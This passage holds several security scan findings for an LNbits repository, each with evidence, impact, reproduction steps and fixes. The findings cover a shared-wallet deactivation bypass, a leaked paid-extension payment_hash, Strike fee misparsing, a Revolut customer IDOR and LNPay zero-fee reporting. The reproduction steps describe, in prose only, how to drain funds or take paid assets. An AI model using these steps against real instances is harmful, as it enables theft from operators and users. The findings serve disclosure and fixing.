That activation check is applied to the account that owns the presented key. With wallet sharing, the key that spends an owner's funds belongs to a different account: the grantee's lightning-shared mirror wallet. `get_wallet_for_key` (crud/wallets.py:295-319) validates the grantee's account, then resolves the mirror to the owner's wallet through `get_source_wallet` -> `get_standalone_wallet` (crud/wallets.py:343-355, 149-178), which queries only `wallets ... deleted = false`. The spend path (`_pay_from_wallet` -> `_pay_invoice` -> `get_wallet(source_wallet_id)` -> `create_payment`, services/payments.py:1393-1435, 780-800; crud/payments.py:243-254) likewise never looks at the owner's account.

Consequence: after an admin deactivates user O, any account G that O had granted `send-payments` on a wallet can keep draining that wallet with G's mirror admin key - `POST /api/v1/payments {out:true, payment_request}` succeeds and debits O's wallet - and with `receive-payments`/`view-payments` keep operating it. Since registration is open by default, O can pre-arrange this with a second account they control: share the wallet with send permission, and deactivation no longer stops the withdrawal of the funds the admin intended to freeze (e.g. pending a fraud investigation). The admin UI gives no indication that shares bypass deactivation.

The analogous protection exists for deletion: a soft-deleted source makes `get_source_wallet` return None and every mirror operation fails, showing the resolution step is where owner-state checks belong. Related but distinct: `deactivation-does-not-evict-auth-cache` (verified) covers the user's OWN cached credentials surviving for the cache TTL; this finding is a persistent, DB-level gap through a different principal (the grantee) with no time bound.

## Evidence
1. [lnbits/core/crud/wallets.py:343–355](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L343-L355)
   get_source_wallet is the single point where a grantee's mirror resolves to the owner's wallet. It loads the source with get_standalone_wallet(shared_wallet_id, False, conn) - a plain wallets query filtered only on deleted=false - then copies balance/permissions via mirror_shared_wallet. The owner's accounts.activated flag is never consulted, so a deactivated owner's wallet is handed to the grantee exactly as before deactivation. Both the KeyChecker path (get_wallet_for_key) and the spend path (get_wallet) funnel through here, so this is where the fix must go.
2. [lnbits/core/crud/wallets.py:295–341](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L295-L341)
   get_wallet_for_key and get_base_wallet_for_key are the shipped activation control for API-key auth: INNER JOIN accounts ON wallets.user = accounts.id ... AND accounts.activated = true. The join is on the wallet that OWNS the presented key - for a lightning-shared mirror that is the grantee's account, not the source owner's. get_wallet_for_key then calls get_source_wallet with no further check.
3. [lnbits/decorators.py:168–176](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L168-L176)
   LightKeyChecker (require_base_invoice_key, used by POST /api/v1/payments) authenticates the mirror key via get_base_wallet_for_key and _check_user_access(wallet.user) - both evaluated for the grantee's account only - and returns the mirror wallet id, which is then passed to pay_invoice.
4. [lnbits/core/crud/wallets.py:149–178](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L149-L178)
   get_standalone_wallet has no accounts join (WHERE id = :wallet AND deleted = :deleted); it is what get_source_wallet and every spend-side re-fetch (get_wallet at 181-190) use for the source wallet.
5. [lnbits/core/services/payments.py:1393–1435](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1393-L1435)
   _pay_from_wallet calls _check_wallet_for_payment(mirror_id) -> get_wallet -> get_source_wallet, checks only the mirror's can_send_payments (the share permission), then builds the CreatePayment with wallet_id=wallet.source_wallet_id, i.e. the deactivated owner's wallet, and debits it via _pay_invoice.
6. [lnbits/core/services/payments.py:780–799](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L780-L799)
   _pay_invoice re-fetches the source wallet with get_wallet (no activation check) and proceeds to _pay_internal_invoice/_pay_external_invoice, which debit it.
7. [lnbits/core/crud/payments.py:243–254](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L243-L254)
   create_payment's spend gate checks only wallet.can_send_payments on the source wallet (always true for a plain lightning wallet); the owner's account state is not part of the ledger-level guard either.
8. [lnbits/core/views/user\_api.py:239–269](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/user_api.py#L239-L269)
   Admin deactivation flips accounts.activated and clears the user's own cache; it does nothing to shares the user has granted, so grantees' mirror keys remain fully usable against the frozen account's funds.
9. [tests/api/test\_users.py:698–755](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/api/test_users.py#L698-L755)
   The maintainers' deactivation test asserts that immediately after deactivation the user's own wallet keys get 404 on payment listing, invoice creation and out:true payments - i.e. deactivation is meant to freeze the account's wallets, not merely its login. The grantee path gives a different principal what the owner itself is refused.

## Impact
The operator's freeze on a deactivated account's funds is ineffective: the wallet can be emptied through a grantee indefinitely, and its payments remain readable through a view-permission mirror (C:L). Impact is limited to wallets the deactivated user had deliberately shared with send permission and to that user's own funds, not other users' money: I:L. No availability impact.

## Reproduction steps
1. Attacker is a shared-wallet grantee with send permission (possibly the deactivated user's own second account, arranged in advance). They use their mirror wallet's admin key against POST /api/v1/payments over the network; nothing special to defeat. The condition that makes it an attack - the owner's account having been deactivated by an admin - is runtime state outside the attacker's control (AT:PRESENT).

## Recommended fix
Mirror-to-source resolution (get_source_wallet/get_standalone_wallet) and the spend path check the grantee's account activation but never the source wallet owner's, so deactivation does not freeze shared wallets. Fix criteria: A lightning-shared mirror must be unusable (resolve to no wallet, or lose all permissions) while the source wallet's owner account is deactivated, on both key-based and session-based paths. Verify: deactivate the owner, then attempt pay/receive/list with the grantee's mirror key and expect the same 404/forbidden the owner's own key receives; reactivation restores access.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect authorization
**CWE:** [CWE-863](https://cwe.mitre.org/data/definitions/863.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257543

---

# Extension list exposes admin's paid-release payment_hash download credential to all users

## Details
`GET /api/v1/extension/all` (`extensions()`, lnbits/core/views/extension_api.py:920-1018) is reachable by any registered account (`check_account_id_exists`, no admin check) and returns, for every installed extension, `installedRelease: dict(ext.meta.installed_release)` (:1001-1005). `ExtensionRelease` carries `payment_hash` (lnbits/core/models/extensions.py:366). When an admin installs a paid release, `api_install_extension` copies the request's `payment_hash` onto the release (:112) and it is persisted in `installed_extensions.meta` (installed_release, and `meta.payments` via `_remember_payment_info`, models/extensions.py:814-826).

That value is the purchase credential of the paid-release protocol LNbits implements: `archive_url` is `{archive}?version=v{version}&payment_hash={payment_hash}` (models/extensions.py:377-382) and `download_archive` fetches exactly that URL (:601-607); the browser likewise stores it in localStorage as the reusable 'paylink hash' (static/js/pages/extensions.js:925-937). `api_install_extension` never verifies the hash against a local payment, so a hash copied from this response can be fed to any LNbits instance's install flow, or placed directly on the archive URL, to obtain the paid archive without paying (assuming the author's pay server releases the archive on a paid `payment_hash`, which is the contract this code implements but cannot be verified in this checkout).

The handler already strips `pay_to_enable.wallet` for non-admins (:946-948), and every other paid-release route (`/{ext_id}/releases` :721, `/{ext_id}/invoice/install` :747) is `check_admin`-gated, so the project treats this data as admin-only; the omission is in the `installedRelease` serialisation. Victims: the operator (purchase credential disclosed) and the extension author (paid asset obtainable without payment). Holds only once at least one paid release has been installed on the instance.

## Evidence
1. [lnbits/core/views/extension\_api.py:1001–1005](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L1001-L1005)
   extensions() builds the per-extension entry with installedRelease = dict(ext.meta.installed_release): the whole persisted ExtensionRelease, including payment_hash, pay_link, archive and cost_sats, is returned to every caller.
2. [lnbits/core/views/extension\_api.py:920–921](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L920-L921)
   The route is GET /api/v1/extension/all gated only by check_account_id_exists — any registered account (registration is open by default), no admin check; the frontend extensions page calls it for every user (static/js/pages/extensions.js:1437).
3. [lnbits/core/views/extension\_api.py:946–948](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L946-L948)
   The same handler blanks pay_to_enable.wallet for non-admins, so the response is already meant to be sanitised of admin-only data for ordinary users; installed_release.payment_hash is left in.
4. [lnbits/core/views/extension\_api.py:112–113](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L112-L113)
   api_install_extension (check_admin) copies the request's payment_hash onto release.payment_hash and persists it as meta.installed_release (and, after download, meta.payments via _remember_payment_info). The hash is never checked against a local payment, so a hash obtained elsewhere is accepted by any LNbits install flow.
5. [lnbits/core/models/extensions.py:376–382](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L376-L382)
   archive_url appends the payment_hash to the paid archive URL (`{archive}?version=v{version}&payment_hash={payment_hash}`): the hash is the bearer token the extension author's pay server receives as proof of purchase.
6. [lnbits/core/models/extensions.py:601–607](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L601-L607)
   download_archive fetches installed_release.archive_url, so this payment_hash is what is actually presented to the author's server to obtain the paid archive.
7. [lnbits/core/views/extension\_api.py:721–739](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extension_api.py#L721-L739)
   The sanctioned route for paid-release purchase state, GET /{ext_id}/releases (paid_sats from meta.payments), is check_admin-gated — the project does not concede this data to ordinary users.

## Impact
Discloses the operator's purchase credential for each installed paid extension to every ordinary user, crossing the user↔admin boundary; nothing on the LNbits instance is modified or made unavailable. Subsequent-system impact: Assumption: the extension author's pay server (a remote service outside this repository) releases the paid archive to GET {archive}?version=..&payment_hash=.. for a paid hash, which is the contract archive_url/download_archive implement. Under that assumption the author's paid archive becomes retrievable by anyone with an account on the instance, including via another LNbits install flow since api_install_extension does not verify the hash locally.

## Reproduction steps
1. Any self-registered account (registration open by default) sends GET /api/v1/extension/all and reads installedRelease.payment_hash, archive, pay_link and cost_sats for each installed paid extension; no interaction from the admin is needed. The instance must have at least one paid release installed (runtime state outside the attacker's control), hence AT:P.

## Recommended fix
The user-facing extension list serialises the full persisted ExtensionRelease (including the purchase credential payment_hash) instead of a sanitised view, and only pay_to_enable.wallet is stripped for non-admins. Fix criteria: Responses from GET /api/v1/extension/all to non-admin accounts must not include installedRelease.payment_hash (and should omit other purchase data such as pay_link/cost_sats unless the UI needs them); use a dedicated response model so new ExtensionRelease fields are not exposed by default. Verify: a non-admin user's response contains no payment_hash for any extension, while the admin flow (releases/install/update) still functions.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-212](https://cwe.mitre.org/data/definitions/212.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257542

---

# Strike pay_invoice fee parser ignores the fee object's currency, scaling a non-BTC fee as BTC and over-debiting the payer's wallet

## Details
StrikeWallet.pay_invoice() (lnbits/wallets/strike.py:259-278) converts the fee of the PATCH /payment-quotes/{id}/execute response with _parse_payment_fee() (:544-556), which selects `lightning.networkFee` or, failing that, `totalFee`, and does `fee_msat = int(Decimal(fee_obj['amount']) * 1e11)` without reading `fee_obj['currency']`. The other two fee parsers in the same adapter select the identical object from the same Payment schema (`lightning_data.get('networkFee') or data.get('totalFee')`, :613 and :660) and branch on the currency (BTC x1e11, SAT x1000, any other unit -> 0, :614-623 and :662-669), so the project's own code treats a non-BTC-denominated fee object as something Strike returns; only the immediate-success branch of pay_invoice (state SUCCEEDED/COMPLETED, :271-278) lacks the check. LNbits also does nothing to pin the unit: _create_payment_quote() posts only {'lnInvoice': bolt11} (:490-493) with no `sourceCurrency`, so the balance Strike debits -- and the currency its `totalFee` is expressed in -- is the Strike account's default, whereas create_invoice() explicitly pins `targetCurrency: 'BTC'` on the receive side (:197).

When the selected fee object is in a non-BTC unit (e.g. the account's fiat balance currency, in which Strike expresses totalFee), the raw amount is multiplied by 1e11: a totalFee of '0.05' becomes 5e9 msat (0.05 BTC). The core then runs update_payment_success_status() (lnbits/core/services/payments.py:1050-1055), which writes payment.fee = -(abs(status.fee_msat) + service_fee) verbatim, with no comparison against the fee_limit_msat / fee reserve the payment was dispatched with, and the `balances` view sums `amount - ABS(fee)` (lnbits/core/migrations.py:947), so the paying wallet's ledger balance is reduced by orders of magnitude more than the routing fee Strike actually charged, possibly below zero. The polled path (get_payment_status -> _get_payment_status_by_quote_id / _by_checking_id) is currency-aware, so the same payment is charged differently depending on whether Strike confirmed it synchronously or on a later poll.

Reachability: any wallet admin-key holder paying an external invoice (POST /api/v1/payments) on an instance funded by StrikeWallet exercises pay_invoice; the misparse needs no adversary -- it is LNbits' misinterpretation of the trusted backend's reply, and the party harmed is the payer (ledger integrity), with the surplus left unallocated in the operator's Strike pot. Condition and explicit assumption: this holds only when Strike's execute response denominates the selected fee object in a unit other than BTC. The repository does not settle Strike's actual response shape (no fixture or recorded sample; the SAT branch in the sibling parsers may be speculative); the evidence for the condition is the project's own currency handling of the same object at :614-623 and :662-669 and its failure to request a BTC source balance. A malicious Strike is not the attacker here: as money source of truth it can already report any BTC-denominated fee, so that framing adds nothing.

## Evidence
1. [lnbits/wallets/strike.py:544–556](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/strike.py#L544-L556)
   _parse_payment_fee() selects lightning.networkFee or totalFee from the execute response, reads only 'amount', ignores 'currency', and multiplies by 1e11 as if the amount were BTC. This is the code the fix must change.
2. [lnbits/wallets/strike.py:259–278](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/strike.py#L259-L278)
   pay_invoice() calls _parse_payment_fee() on the execute response and, when state is SUCCEEDED/COMPLETED, returns PaymentResponse(ok=True, fee_msat=<misparsed fee>) to the core.
3. [lnbits/wallets/strike.py:487–493](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/strike.py#L487-L493)
   _create_payment_quote() posts only {'lnInvoice': bolt11} -- no sourceCurrency -- so LNbits leaves the debited balance, and the unit of totalFee, to the Strike account's default; contrast create_invoice() which pins targetCurrency 'BTC' (:197).
4. [lnbits/wallets/strike.py:660–672](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/strike.py#L660-L672)
   _get_payment_status_by_checking_id() selects the identical fee object from the same Payment schema and branches on currency (BTC x1e11, SAT x1000, otherwise 0); _get_payment_status_by_quote_id (:611-631) does the same. The project's own code treats non-BTC fee units as expected for this object; only the pay_invoice path diverges.
5. [lnbits/core/services/payments.py:1050–1055](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1050-L1055)
   update_payment_success_status() writes payment.fee = -(abs(status.fee_msat) + service_fee) verbatim, with no bound against the fee_limit_msat / fee reserve the payment was dispatched with (:909, :926).
6. [lnbits/core/migrations.py:947](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/migrations.py#L947)
   The balances view computes SUM(amount - ABS(fee)), so the inflated fee row is subtracted from the paying wallet's balance, which can go negative.

## Impact
Integrity of the apipayments ledger: the paying wallet's fee row and balance are corrupted by a fee scaled up to 1e11x, possibly driving the balance negative; the reach is the payer's own wallet per affected payment and the trigger is an unverified property of the remote API, so LOW. No confidentiality impact; the service stays up, so availability NONE.

## Reproduction steps
1. The path is exercised by an ordinary wallet admin-key holder paying an external invoice (PR:L) on a Strike-funded instance; the misparse needs no adversary and no further interaction. It is conditional (AT:P) on the fee object in Strike's execute response being denominated in a non-BTC unit -- an explicit assumption about Strike's API that the repository does not settle; the code evidence for it is the adapter's own currency branching for the same object (:614-623, :662-669) and its omission of sourceCurrency in the quote request (:490-493). The response arrives over the network from the remote backend (AV:N).

## Recommended fix
1. _parse_payment_fee() converts the fee amount to millisatoshis assuming BTC regardless of the accompanying currency field, inconsistent with the two currency-aware fee parsers in the same adapter. Fix criteria: The pay_invoice fee conversion must honour fee_obj['currency'] exactly as the status parsers do (BTC -> x1e11, SAT -> x1000, any other unit -> no fee or treat the payment as pending for a currency-aware poll), ideally through one shared helper used by all three paths. Verify that an execute response whose fee object is {'amount':'0.05','currency':'USD'} does not yield a BTC-scaled fee_msat, and that {'amount':'0.00000001','currency':'BTC'} yields 1000.
2. The payment quote request omits sourceCurrency, so the balance Strike debits and the unit of totalFee follow the account's default rather than a unit LNbits controls, unlike the receive side which pins targetCurrency 'BTC'. Fix criteria: The quote request should specify the BTC source balance (sourceCurrency 'BTC') so fee and total amounts arrive in a deterministic unit, while the parser still validates the unit rather than assuming it.
3. The core accepts any backend-reported fee for a successful payment without bounding it by the fee limit the payment was dispatched with, so a misparsed or absurd fee lands in the ledger unchecked. Fix criteria: A fee reported by the funding source that exceeds the fee_limit_msat / fee reserve passed to pay_invoice should be clamped or flagged for operator review rather than written verbatim. Verify that a PaymentResponse with fee_msat far above the reserve does not reduce the wallet balance beyond the reserved amount.

---
**Severity:** LOW
**Status:** Open
**Category:** Incorrect calculation
**CWE:** [CWE-682](https://cwe.mitre.org/data/definitions/682.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257541

---

# Revolut create_subscription binds subscription to any existing merchant customer by unverified email

## Details
`RevolutWallet.create_subscription` (lnbits/fiat/revolut.py) requires a `customer_email` and resolves it with `_get_customer_by_email`, which lists the operator's Revolut merchant customers and returns the first whose stored email equals the supplied one (case-insensitive, `_find_customer_by_email`). The subscription is then created with `payload['customer_id']` set to that record's id. The email comes straight from the request body of `POST /api/v1/fiat/revolut/subscription` (lnbits/core/views/fiat_api.py:130-168), which is reachable with any wallet admin key and forwards `payment_options.customer_email` unchanged; it is never checked against the requesting account's own (optionally verified) email, and LNbits keeps no per-wallet customer mapping.

Any LNbits user on a Revolut-enabled instance can therefore name another person's email — another LNbits user who previously subscribed, or any customer of the operator's Revolut merchant account — and have LNbits, acting with the merchant secret key, create a subscription for a plan of the attacker's choice on the victim's customer record, with the attacker's wallet in `external_reference` (so every cycle order is credited to the attacker's wallet by the webhook handler in callback_api.py `_handle_revolut_subscription`), and receive the setup-order checkout URL. Effects that follow from the code alone: the attacker's subscription, its setup order and cycle orders are attributed to the victim's customer identity in the operator's Revolut account; whatever payment method is used on the setup order is saved to the victim's record for recurring billing; the merchant's customer data and any customer-based reporting, communication or receipts are polluted. Whether Revolut's hosted checkout (merchant.revolut.com, API version 2026-04-20 as pinned in settings) offers a customer's saved payment methods for an order bound to their `customer_id` without further authentication — which would let the attacker fund the setup order and recurring cycles from the victim's card while sats are credited to the attacker's wallet — is Revolut-side behaviour this review could not confirm from the repository; it is an explicit, unrated assumption.

Root cause: a caller-supplied attribute (email) is used as the key to select and act on an existing third-party record in the merchant account, with no ownership or authorization check (CWE-639). Sibling providers (Stripe/Square/PayPal) pass no customer lookup, so the defect is specific to the Revolut provider.

## Evidence
1. [lnbits/fiat/revolut.py:381–412](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/revolut.py#L381-L412)
   _get_subscription_customer_id takes the caller-supplied payment_options.customer_email, and _get_customer_by_email pages through up to 20x500 of the operator's Revolut customers (GET /api/customers under the merchant secret key) returning the id of the first whose stored email matches; that id is used as-is. Nothing checks that the requesting wallet/account owns that email or that customer record; only when no match exists is a new customer created.
2. [lnbits/fiat/revolut.py:251–262](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/revolut.py#L251-L262)
   The matched customer_id is written into payload['customer_id'] and POSTed to /api/subscriptions with external_reference carrying the attacker's wallet_id; the setup order's checkout_url is then fetched and returned to the caller, so the attacker receives a checkout for a subscription attached to a third party's customer record.
3. [lnbits/core/views/fiat\_api.py:130–167](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/fiat_api.py#L130-L167)
   POST /api/v1/fiat/{provider}/subscription is guarded only by require_admin_key (any wallet admin key). It normalises wallet_id to the key's wallet but forwards data.payment_options, including customer_email, unchanged to the provider.
4. [lnbits/fiat/revolut.py:639–646](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/revolut.py#L639-L646)
   _find_customer_by_email matches the caller's string casefolded against each customer's stored email; any customer in the merchant account is selectable by knowing their email.
5. [lnbits/fiat/base.py:98–101](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/fiat/base.py#L98-L101)
   customer_email is a plain optional str on FiatSubscriptionPaymentOptions with no restriction (unlike tag/extra, documented 'Admin only'); nothing ties it to the account's own email or email_verified flag.

## Impact
No LNbits-stored data, wallet balance or ledger entry is altered by the binding itself: the subscription lives in Revolut, and payments later credited to the attacker's wallet correspond to fiat actually received on the setup/cycle orders. LNbits itself suffers no confidentiality, integrity or availability impact; the harm lands on the merchant account. Subsequent-system impact: The operator's Revolut merchant account and the victim's customer record there are modified under the merchant key: an attacker-chosen subscription and its setup/cycle orders are attached to the victim's identity and the payment method used on the setup order is saved to that record. Low integrity impact on a third-party system. Higher impact (paying from the victim's saved payment methods at hosted checkout) depends on unverified Revolut behaviour and is not rated.

## Reproduction steps
1. Attacker: a self-registered LNbits user holding their own wallet admin key on an instance where the operator has enabled the Revolut provider, who knows the email of a victim that already exists as a customer in the operator's Revolut account (e.g. any prior subscriber). One authenticated POST /api/v1/fiat/revolut/subscription with customer_email set to the victim's address; LNbits pages the merchant's customers, matches by email, and creates the subscription on that record, returning the checkout URL. No victim interaction; the precondition that the victim is an existing merchant customer is the attack requirement.

## Recommended fix
1. A caller-supplied email is used as the key to select an existing Revolut customer record, and that record is acted upon with the merchant secret key without verifying the caller is entitled to it. Fix criteria: A subscription must only be attached to a Revolut customer the requesting LNbits account/wallet is entitled to: a customer record LNbits itself created and persisted for that account or wallet, or one keyed to an email verified for the account (users.py email_verified). A request naming an email that resolves to a different party's customer must not reuse that customer_id. Verify that two distinct wallets supplying the same email cannot both be bound to one pre-existing customer record.
2. The Revolut provider silently performs a merchant-wide customer search for whatever email the subscriber supplies. Fix criteria: Remove or restrict the email-to-existing-customer lookup so that matching is confined to customers LNbits created for the caller (or always create/reuse a per-wallet customer); the lookup must never return records created for other wallets or outside LNbits.

---
**Severity:** LOW
**Status:** Open
**Category:** Insecure direct object reference
**CWE:** [CWE-639](https://cwe.mitre.org/data/definitions/639.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257539

---

# LNPay backend reports fee_msat=0 for every paid invoice, so routing fees are never charged

## Details
`LNPayWallet.pay_invoice` (lnbits/wallets/lnpay.py:108-139) posts only `{"payment_request": bolt11}` to `/wallet/{key}/withdraw` (the `fee_limit_msat` argument is never sent) and on success returns `PaymentResponse(ok=True, checking_id=data["lnTx"]["id"], fee_msat=0, preimage=...)` — the routing fee is a hard-coded constant, not read from the response. The sibling `get_payment_status` (:144-156) reads `fee_msat` from the same lnTx object at `/lntx/{id}`, so the backend does report it; `pay_invoice` discards it.

Core treats the backend's fee report as the settlement of record: `_pay_external_invoice` (core/services/payments.py:887-902) holds `amount + fee_reserve + service_fee` at dispatch by writing `fee = -fee_reserve_total`, then on `payment_response.success` (:954-960) calls `update_payment_success_status`, which overwrites it with `payment.fee = -(abs(status.fee_msat or 0) + abs(service_fee_msat))` (:1052). With `fee_msat=0` the whole routing-fee reserve is released back to the payer's balance (crud/payments.py:350 computes spending as `abs(amount) + abs(fee)`), while the operator's LNPay balance was debited amount plus the real routing fee. The row is SUCCESS, so `check_pending_payments` (:441-487, pending rows only) and `check_payment_status` (:705-706 returns the stored fee for SUCCESS rows) never correct it.

Any registered user holding a wallet admin key turns this into extraction rather than an accounting leak: they publish an invoice from a node reachable only through a routing hop they control with a high fee policy and pay it via `POST /api/v1/payments`. LNPay pays amount + routing fee (bounded only by LNPay's own policy, since no fee limit is sent), the attacker's hop collects the fee, and LNbits debits the attacker amount + service fee only. Each payment moves the routing fee from the operator's funding source to the attacker.

Conditions: holds only when the instance runs `LNBITS_BACKEND_WALLET_CLASS=LNPayWallet` — a documented funding source (docs/guide/wallets.md:218-227) in the default `lnbits_allowed_funding_sources` (settings.py:1263-1287). With this backend `create_invoice` returns no `checking_id` (lnpay.py:99-102) so core rejects every incoming Lightning invoice (payments.py:376-384); the attacker's balance must therefore come from fiat top-ups, admin credit, internal transfers or pre-existing balances, which bounds repetition but not the per-payment loss. Assumption: LNPay's withdraw response `lnTx` carries `fee_msat` as the `/lntx/{id}` object does (LNPay is a remote hosted API with no pinned version in the repository); if it did not, the correct report would be `fee_msat=None` with reconciliation, never 0.

## Evidence
1. [lnbits/wallets/lnpay.py:108–139](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/lnpay.py#L108-L139)
   pay_invoice sends only the payment_request (fee_limit_msat is dropped) and on success returns PaymentResponse(ok=True, checking_id=data["lnTx"]["id"], fee_msat=0, preimage=...) — the routing fee is a hard-coded constant, not read from the lnTx object in the response.
2. [lnbits/wallets/lnpay.py:144–156](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/lnpay.py#L144-L156)
   get_payment_status reads data.get("fee_msat") from the same lntx object type at /lntx/{id}, showing the LNPay transaction record carries the routing fee that pay_invoice ignores.
3. [lnbits/core/services/payments.py:1038–1052](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1038-L1052)
   update_payment_success_status sets payment.fee = -(abs(status.fee_msat or 0) + abs(service_fee_msat)) (:1052); with fee_msat=0 the payer is charged only the service fee and the routing-fee reserve held at dispatch is released back to their balance.
4. [lnbits/core/services/payments.py:954–960](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L954-L960)
   _pay_external_invoice takes the success branch on PaymentResponse.success and passes the backend's PaymentResponse to update_payment_success_status, so the zero fee is final; the row becomes SUCCESS and check_pending_payments (:441-487) and check_payment_status (:705-706) never re-read the fee.
5. [lnbits/core/services/payments.py:887–902](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L887-L902)
   Dispatch requires balance >= amount + fee_reserve_total and records fee = -fee_reserve_total (:902) as a temporary hold that the backend-reported fee replaces on success; an under-reported fee therefore directly releases operator-paid routing fees to the sender's balance.
6. [lnbits/core/crud/payments.py:350](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L350)
   Wallet balance counts outgoing spending as abs(amount) + abs(fee), so reducing a SUCCESS payment's fee from the reserve to the service fee alone raises the payer's spendable balance by the released routing fee.

## Impact
